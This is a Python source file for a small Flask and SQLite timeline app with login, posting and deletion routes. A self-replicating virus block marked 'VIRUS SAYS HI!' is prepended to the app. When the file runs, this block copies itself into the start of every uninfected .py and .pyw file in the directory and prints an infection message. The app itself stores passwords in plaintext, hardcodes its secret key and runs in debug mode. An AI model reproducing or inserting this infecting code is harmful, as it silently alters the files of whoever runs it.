# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
# -*- coding: utf-8 -*-
import os
import sqlite3

from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)
app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL
        )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            content TEXT NOT NULL,
            FOREIGN KEY (user_id) REFERENCES user(id)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    # Use INSERT OR IGNORE to avoid duplicates
    cur.executemany('INSERT OR IGNORE INTO user (username, password) VALUES (?, ?)', users)
    cur.executemany('INSERT OR IGNORE INTO time_line (user_id, content) VALUES (?, ?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    # Parameterized query to prevent SQL injection
    cur.execute(
        'SELECT id, username FROM user WHERE username = ? AND password = ?',
        (username, password)
    )
    row = cur.fetchone()
    conn.close()
    if row:
        return {'id': row[0], 'username': row[1]}
    return None


def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM user WHERE id = ?', (uid,))
    row = cur.fetchone()
    conn.close()
    if row:
        return {'id': row[0], 'username': row[1]}
    return None


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    # Parameterized insertion
    cur.execute(
        'INSERT INTO time_line (user_id, content) VALUES (?, ?)',
        (uid, content)
    )
    conn.commit()
    conn.close()


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
    rows = cur.fetchall()
    conn.close()
    return [{'id': r[0], 'user_id': r[1], 'content': r[2]} for r in rows]


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    # Ensure only owner can delete
    cur.execute('DELETE FROM time_line WHERE user_id = ? AND id = ?', (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<form method="POST" style="margin: 60px auto; width: 140px;">
    <p><input name="username" type="text" required /></p>
    <p><input name="password" type="password" required /></p>
    <p><input value="Login" type="submit" /></p>
</form>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<div style="width: 400px; margin: 80px auto; ">
    <h4>I am: {{ user.username }}</h4>
    <form method="POST" action="/create_time_line">
        Add time line:
        <input type="text" name="content" required />
        <input type="submit" value="Submit" />
    </form>
    <ul style="border-top: 1px solid #ccc;">
        {% for line in time_lines %}
        <li style="border-top: 1px solid #efefef;">
            <p>{{ line.content }}</p>
            {% if line.user_id == user.id %}
            <a href="/delete/time_line/{{ line.id }}">Delete</a>
            {% endif %}
        </li>
        {% endfor %}
    </ul>
</div>
    ''')
    return template.render(user=user, time_lines=time_lines)


@app.route('/init')
def init_page():
    init()
    return redirect('/')

@app.route('/')
def index():
    if session.get('uid'):
        return render_home_page(session['uid'])
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    username = request.form.get('username')
    password = request.form.get('password')
    user = get_user_from_username_and_password(username, password)
    if user:
        session['uid'] = user['id']
        return redirect('/')
    return redirect('/login')

@app.route('/create_time_line', methods=['POST'])
def time_line():
    if session.get('uid'):
        content = request.form.get('content', '').strip()
        if content:
            create_time_line(session['uid'], content)
    return redirect('/')

@app.route('/delete/time_line/<int:tid>')
def delete_time_line(tid):
    if session.get('uid'):
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.pop('uid', None)
    return redirect('/login')

if __name__ == '__main__':
    app.run(debug=True)
